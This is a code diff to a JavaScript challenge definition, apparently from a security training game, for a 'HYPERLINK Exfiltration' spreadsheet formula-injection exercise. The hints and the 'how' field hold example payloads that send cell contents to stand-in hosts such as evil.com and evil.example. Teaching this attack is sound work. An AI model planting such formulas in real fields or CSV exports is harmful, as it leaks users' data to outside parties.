@@ -105,7 +105,7 @@ module.exports = {
     name: 'HYPERLINK Exfiltration',
     difficulty: 'Medium',
     hint: 'HYPERLINK can point anywhere and show any label. Combine it with cell references to leak neighboring data.',
-    hints: ["HYPERLINK can exfiltrate data. The formula is =HYPERLINK(...).", "The link URL can include cell data. It's a data theft primitive.", "Submit =HYPERLINK(\"http://evil.com/?\"&A1,\"click\")."],
+    hints: ["HYPERLINK can exfiltrate data. The formula is =HYPERLINK(...).", "The link URL can include cell data. It's a data theft primitive.", "Build a HYPERLINK formula cell whose destination URL glues an attacker address to the contents of a neighboring cell, with a friendly label to disguise it. The key insight: the link text and the link target can be completely different things."],
     tools: "B",
     how: 'Put a =HYPERLINK("http://evil.example",...) payload in a field and download the CSV export.',
     link: '/formula#formula-hyperlink',
